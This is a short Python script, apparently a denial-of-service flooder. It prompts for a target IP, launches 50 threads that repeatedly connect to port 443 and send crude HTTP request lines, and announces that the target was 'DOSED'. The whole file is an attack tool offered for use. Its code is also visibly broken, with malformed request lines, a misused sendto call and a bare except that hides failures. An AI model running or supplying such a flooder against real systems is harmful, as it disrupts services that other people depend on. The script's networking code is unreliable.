import socket
import threading

try:
	ip = input("Target's IP: ")

	data = f"GET /{ip}HTTP/1.1\r\r"
	requests = 0

	def send():
		global data
		global requests

		while True:
			s = socket.socket()
			s.connect((ip, 443))
			info = s.recv(1024).decode("utf-8")
			if info:
				s.sendto((data).encode("utf-8"), (ip, 443))
				s.sendto(("Host: 33.234.12.182 \r\n\r\n").encode("utf-8"))
				s.close()
				print(f"{requests} sent till yet")
				requests+=1
			else:
				print(f"pass valid IP.")
				break

	for a in range(50):
		thread = threading.Thread(target=send)
		thread.start()
	send()
	print(f"Successfully DOSED {ip}")
except:
	print("something went wrong!")
